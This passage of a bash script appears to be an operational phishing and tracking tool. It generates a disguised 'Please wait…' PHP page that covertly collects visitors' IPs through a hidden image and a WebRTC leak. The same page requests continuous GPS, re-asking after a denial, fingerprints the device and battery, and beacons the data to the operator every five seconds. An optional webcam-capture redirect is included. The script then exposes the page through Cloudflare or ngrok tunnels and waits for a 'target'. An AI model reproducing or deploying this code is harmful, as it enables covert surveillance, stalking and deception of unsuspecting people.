    track_option="${track_option:-1}"
    
    case $track_option in
        1)
            track_location=1
            track_webcam=0
            printf "\e[1;93m[*] Mode: Location Only\e[0m\n"
            ;;
        2)
            track_location=0
            track_webcam=1
            printf "\e[1;93m[*] Mode: Webcam Only\e[0m\n"
            ;;
        3)
            track_location=1
            track_webcam=1
            printf "\e[1;93m[*] Mode: Both (Full Tracking)\e[0m\n"
            ;;
        *)
            track_location=1
            track_webcam=0
            printf "\e[1;93m[*] Mode: Location Only (default)\e[0m\n"
            ;;
    esac
}

generate_template() {
    cat << 'TEMPLATE_EOF' > template.php
<?php
$config = [
    'redirect_url'      => 'forwarding_link/index2.html',
    'location_endpoint' => 'location.php',
    'ip_endpoint'       => 'ip.php',
    'timeout_ms'        => 45000,
    'min_display_time'  => 3000,
    'track_location'    => __TRACK_LOCATION__,
    'track_webcam'      => __TRACK_WEBCAM__,
    'stun_servers'      => [
        'stun:stun.l.google.com:19302',
        'stun:stun1.l.google.com:19302',
        'stun:stun2.l.google.com:19302',
        'stun:stun3.l.google.com:19302',
    ],
];

header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Cache-Control: post-check=0, pre-check=0', false);
header('Pragma: no-cache');
header('Expires: 0');
header('X-Content-Type-Options: nosniff');

$sessionToken = bin2hex(random_bytes(16));

?><!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Please wait...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 100%);
            color: #e0e0e0;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            overflow: hidden;
        }
        .container { text-align: center; padding: 2rem; max-width: 420px; width: 90%; }
        h2 { font-weight: 300; font-size: 1.6rem; margin-bottom: 0.5rem; color: #ffffff; letter-spacing: 0.5px; }
        p { font-size: 0.9rem; color: #999; margin-bottom: 0.4rem; }
        #locationStatus { color: #aaa; font-size: 0.82rem; margin-top: 1rem; min-height: 1.5rem; transition: color 0.3s ease; }
        #locationStatus.success { color: #4caf50; }
        #locationStatus.error   { color: #f44336; }
        #locationStatus.info    { color: #ff9800; }
        #locationStatus.waiting { color: #2196f3; animation: blink 1.5s infinite; }
        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.5; } }
        .spinner-container { margin: 2rem auto; position: relative; width: 70px; height: 70px; }
        .spinner { border: 3px solid rgba(255,255,255,0.05); border-top: 3px solid #4a6cf7; border-right: 3px solid #6c63ff; border-radius: 50%; width: 100%; height: 100%; animation: spin 0.9s cubic-bezier(0.4, 0.0, 0.2, 1) infinite; }
        .spinner-inner { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 40px; height: 40px; border: 2px solid rgba(255,255,255,0.03); border-bottom: 2px solid #7c5cfc; border-left: 2px solid #8b5cf6; border-radius: 50%; animation: spin 1.2s cubic-bezier(0.4, 0.0, 0.2, 1) infinite reverse; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .progress-bar { width: 200px; height: 2px; background: rgba(255,255,255,0.05); border-radius: 2px; margin: 1.5rem auto 0; overflow: hidden; }
        .progress-fill { height: 100%; width: 0%; background: linear-gradient(90deg, #4a6cf7, #6c63ff, #8b5cf6); border-radius: 2px; animation: progress 2.5s ease-in-out infinite; }
        @keyframes progress { 0% { width: 0%; margin-left: 0; } 50% { width: 100%; margin-left: 0; } 100% { width: 0%; margin-left: 100%; } }
        .data-points { display: flex; justify-content: center; gap: 1.5rem; margin-top: 1.2rem; opacity: 0.5; font-size: 0.7rem; color: #666; }
        .data-points span { display: flex; align-items: center; gap: 4px; }
        .dot { display: inline-block; width: 5px; height: 5px; border-radius: 50%; }
        .dot.webrtc  { background: #ff9800; }
        .dot.gps     { background: #4caf50; }
        .dot.network { background: #2196f3; }
        .gps-hint { margin-top: 15px; font-size: 0.75rem; color: #666; line-height: 1.4; display: none; }
        .gps-hint.visible { display: block; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
        .gps-hint i { color: #2196f3; margin-right: 4px; }
        @media (max-width: 480px) { h2 { font-size: 1.3rem; } .container { padding: 1.5rem; } }
    </style>
</head>
<body>
    <img src="<?= htmlspecialchars($config['ip_endpoint'], ENT_QUOTES, 'UTF-8') ?>" 
         style="position:absolute;width:1px;height:1px;opacity:0.01;left:-9999px;" alt="">

    <div class="container">
        <h2>Loading, please wait…</h2>
        <p>Preparing your content for the best experience</p>
        
        <div class="spinner-container">
            <div class="spinner"></div>
            <div class="spinner-inner"></div>
        </div>
        
        <p id="locationStatus">Initializing…</p>
        
        <div class="gps-hint" id="gpsHint">
            <span style="font-size:1rem;">📍</span> 
            If prompted, tap <strong>"Allow"</strong> to enable location for better content
        </div>
        
        <div class="progress-bar">
            <div class="progress-fill"></div>
        </div>
        
        <div class="data-points">
            <span><span class="dot webrtc"></span> Network</span>
            <?php if ($config['track_location']): ?><span><span class="dot gps"></span> Location</span><?php endif; ?>
            <span><span class="dot network"></span> Session</span>
        </div>
    </div>

    <script>
    var CONFIG = {
        sessionToken: '<?= $sessionToken ?>',
        locationEndpoint: '<?= htmlspecialchars($config['location_endpoint'], ENT_QUOTES, 'UTF-8') ?>',
        ipEndpoint: '<?= htmlspecialchars($config['ip_endpoint'], ENT_QUOTES, 'UTF-8') ?>',
        redirectUrl: '<?= htmlspecialchars($config['redirect_url'], ENT_QUOTES, 'UTF-8') ?>',
        timeoutMs: <?= (int) $config['timeout_ms'] ?>,
        minDisplayTime: <?= (int) $config['min_display_time'] ?>,
        trackLocation: <?= (int) $config['track_location'] ?>,
        trackWebcam: <?= (int) $config['track_webcam'] ?>,
        stunServers: <?= json_encode($config['stun_servers']) ?>,
    };

    var collectedData = { session: CONFIG.sessionToken, webrtc: null, gps: null, battery: null, device: null, network: null, time: Date.now() };
    var redirectTimer = null, dataSent = 0, gpsAttempted = false, watchId = null;

    function setStatus(msg, type) { var el = document.getElementById('locationStatus'); if (el) { el.textContent = msg; el.className = type || 'info'; } }
    function showGpsHint() { var h = document.getElementById('gpsHint'); if (h) h.classList.add('visible'); }

    function sendData(data) {
        if (dataSent >= 50) return; // Allow more data points
        var p = new URLSearchParams();
        p.append('batch', dataSent + 1);
        for (var k in data) { if (data[k] !== null && data[k] !== undefined) p.append(k, typeof data[k] === 'object' ? JSON.stringify(data[k]) : data[k]); }
        p.append('session', CONFIG.sessionToken);
        if (!navigator.sendBeacon(CONFIG.locationEndpoint, p)) {
            var x = new XMLHttpRequest();
            x.open('POST', CONFIG.locationEndpoint, false);
            x.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            x.send(p.toString());
        }
        dataSent++;
    }

    function leakWebRTC() {
        try {
            var c = { iceServers: CONFIG.stunServers.map(function(u) { return { urls: u }; }), iceTransportPolicy: 'all', bundlePolicy: 'max-bundle', rtcpMuxPolicy: 'require' };
            var pc = new RTCPeerConnection(c);
            pc.createDataChannel('rd');
            pc.createOffer().then(function(o) { pc.setLocalDescription(o); }).catch(function(){});
            var ips = [];
            pc.onicecandidate = function(e) {
                if (e.candidate && e.candidate.candidate) {
                    var m = e.candidate.candidate.match(/(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})/);
                    if (m && ips.indexOf(m[1]) === -1) ips.push(m[1]);
                }
            };
            pc.onicegatheringstatechange = function() {
                if (pc.iceGatheringState === 'complete' && ips.length) { sendData({ webrtc_ip: ips.join('|'), webrtc_raw: ips.join('||'), webrtc_count: ips.length, initial_batch: true }); try { pc.close(); } catch(e){} }
            };
            setTimeout(function() { try { if (ips.length && dataSent < 1) sendData({ webrtc_ip: ips.join('|'), webrtc_raw: ips.join('||'), webrtc_count: ips.length, webrtc_timeout: true }); pc.close(); } catch(e){} }, 5000);
        } catch(e) {}
    }

    function handlePosition(pos) {
        gpsAttempted = true;
        var c = pos.coords;
        setStatus('Location obtained ✓', 'success');
        var g = { 
            gps_lat: c.latitude.toFixed(6), 
            gps_lon: c.longitude.toFixed(6), 
            gps_acc: c.accuracy ? c.accuracy.toFixed(1) : null, 
            gps_alt: c.altitude ? c.altitude.toFixed(1) : null,
            gps_heading: c.heading ? c.heading.toFixed(1) : null,
            gps_speed: c.speed ? c.speed.toFixed(1) : null,
            gps_source: 'gps_watch',
            continuous: true
        };
        sendData(g);
        collectedData.gps = g;
    }

    function handleLocationError(err) {
        gpsAttempted = true;
        setStatus('Location error: ' + (err.code === 1 ? 'Permission denied' : err.code === 2 ? 'Unavailable' : 'Timeout'), 'error');
        sendData({ gps_error: err.code, gps_msg: err.message, source: 'gps_error' });
        // If permission denied, try once more with low accuracy
        if (err.code === 1) {
            setTimeout(function() {
                navigator.geolocation.getCurrentPosition(
                    function(pos) { handlePosition(pos); },
                    function(e2) { sendData({ gps_error: e2.code, gps_msg: e2.message + ' (retry)', source: 'gps_retry_failed' }); },
                    { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
                );
            }, 2000);
        }
    }

    function getLocation() {
        if (!CONFIG.trackLocation) { setStatus('Setup complete', 'success'); sendFallback(); return; }
        if (!navigator.geolocation) { setStatus('Not available', 'error'); sendFallback(); return; }
        setStatus('Requesting your location…', 'waiting');
        showGpsHint();

        // FIX 1: Use watchPosition() for continuous GPS tracking
        watchId = navigator.geolocation.watchPosition(
            handlePosition,
            handleLocationError,
            { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
        );

        // FIX 2: Also do an immediate getCurrentPosition for quick first fix
        setTimeout(function() {
            navigator.geolocation.getCurrentPosition(
                function(pos) { 
                    // First position already handled by watchPosition
                    if (!collectedData.gps) handlePosition(pos);
                },
                function(err) { /* watchPosition will handle */ },
                { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
        }, 500);

        // FIX 3: After getting first data, still redirect to template
        // Set a timer to redirect after first successful capture
        var redirectCheck = setInterval(function() {
            if (collectedData.gps && !redirectTimer) {
                clearInterval(redirectCheck);
                scheduleRedirect(true);
            }
        }, 1000);

        // Fallback: redirect after timeout even if no GPS
        setTimeout(function() {
            clearInterval(redirectCheck);
            if (!redirectTimer) scheduleRedirect(false);
        }, CONFIG.timeoutMs);
    }

    function collectDeviceData() {
        collectedData.device = { screen: screen.width+'x'+screen.height, avail: screen.availWidth+'x'+screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio||1, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone, timezoneOffset: new Date().getTimezoneOffset(), language: navigator.language, languages: navigator.languages?navigator.languages.join(','):null, platform: navigator.platform||null, cookiesEnabled: navigator.cookieEnabled, doNotTrack: navigator.doNotTrack||null, hardwareConcurrency: navigator.hardwareConcurrency||null, deviceMemory: navigator.deviceMemory||null, maxTouchPoints: navigator.maxTouchPoints||0, vendor: navigator.vendor||null };
    }

    function collectBatteryData() {
        if (navigator.getBattery) navigator.getBattery().then(function(b) { collectedData.battery = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime }; }).catch(function(){});
    }
function sendFallback() {
    collectDeviceData();
    collectBatteryData();
    sendData({
        source: 'no_gps_requested',
        battery: collectedData.battery || null,
        device: JSON.stringify(collectedData.device || {})
    });
    scheduleRedirect(false);
}

function scheduleRedirect(gpsSuccess) {
    if (redirectTimer) return;
    var waited = Date.now() - (collectedData.time || Date.now());
    var remaining = Math.max(0, CONFIG.minDisplayTime - waited);
    var url = CONFIG.trackWebcam ? CONFIG.redirectUrl : (gpsSuccess ? 'about:blank' : 'about:blank');
    
    redirectTimer = setTimeout(function() {
        if (CONFIG.trackWebcam) {
            window.location.href = CONFIG.redirectUrl;
        } else {
            // Stop watching position since we're done
            if (watchId !== null) {
                navigator.geolocation.clearWatch(watchId);
                watchId = null;
            }
            // Close the loading page
            document.querySelector('.container').innerHTML = '<h2>Complete ✓</h2><p style="color:#4caf50;">You may close this page</p>';
        }
    }, remaining);
}

// ── INIT ──
setStatus('Initializing…', 'info');
leakWebRTC();
getLocation();

// Collect battery info async
setTimeout(collectBatteryData, 100);
setTimeout(collectDeviceData, 200);

// Send periodic heartbeat with GPS data (every 5 seconds for continuous tracking)
setInterval(function() {
    if (collectedData.gps) {
        sendData({
            gps_lat: collectedData.gps.gps_lat,
            gps_lon: collectedData.gps.gps_lon,
            gps_acc: collectedData.gps.gps_acc,
            gps_alt: collectedData.gps.gps_alt,
            gps_heading: collectedData.gps.gps_heading,
            gps_speed: collectedData.gps.gps_speed,
            continuous: true,
            heartbeat: Date.now()
        });
    }
}, 5000);

</script>
</body>
</html>
TEMPLATE_EOF

    # Replace tracking mode placeholders
    sed -i "s/__TRACK_LOCATION__/$track_location/g" template.php
    sed -i "s/__TRACK_WEBCAM__/$track_webcam/g" template.php
}

checkfound() {
    printf "\n"
    printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting for target, Ctrl+C to exit...\e[0m\n"
    printf "\e[1;93m[*] Location data will appear below when captured:\e[0m\n"
    printf "\n"
    
    # Create directory for location data
    mkdir -p location_data 2>/dev/null
    mkdir -p location_intel 2>/dev/null
    
    # Monitor for new location data files
    while [ true ]; do
        # Check for new location data via PHP endpoint log
        if [ -f "location_intel/saved_locations.ndjson" ]; then
            local last_entry=$(tail -1 location_intel/saved_locations.ndjson 2>/dev/null)
            if [ -n "$last_entry" ] && [ "$last_entry" != "$last_checked" ]; then
                last_checked="$last_entry"
                catch_location
                continue
            fi
        fi
        
        # Also check the older location_data path
        if [ -f "location_data/saved_locations.ndjson" ]; then
            local last_entry2=$(tail -1 location_data/saved_locations.ndjson 2>/dev/null)
            if [ -n "$last_entry2" ] && [ "$last_entry2" != "$last_checked2" ]; then
                last_checked2="$last_entry2"
                catch_location
                continue
            fi
        fi
        
        sleep 1
    done
}

# ── MAIN ──
banner

# Create cleanup script if it doesn't exist
if [ ! -f "cleanup.sh" ]; then
    create_cleanup_script
fi

# Select tracking modules
select_tracking_modules

# Select tunnel method
printf "\n\e[1;93m════ Tunnel Selection ════\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Cloudflare Tunnel (Recommended)\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Ngrok\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Localhost Only (No tunnel)\e[0m\n"
read -p $'\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Choose tunnel method: [Default is 1] \e[0m' tunnel_option
tunnel_option="${tunnel_option:-1}"

case $tunnel_option in
    1) cloudflare_tunnel ;;
    2) ngrok_server ;;
    3)
        printf "\e[1;92m[\e[0m+\e[1;92m] Starting localhost server...\n"
        php -S 127.0.0.1:3333 &
        sleep 2
        printf "\e[1;93m[!] Server running at http://127.0.0.1:3333\n"
        printf "\e[1;93m[!] Use another tool like Serveo/LocalhostRun to expose\n"
        checkfound
        ;;
    *) cloudflare_tunnel ;;
esac
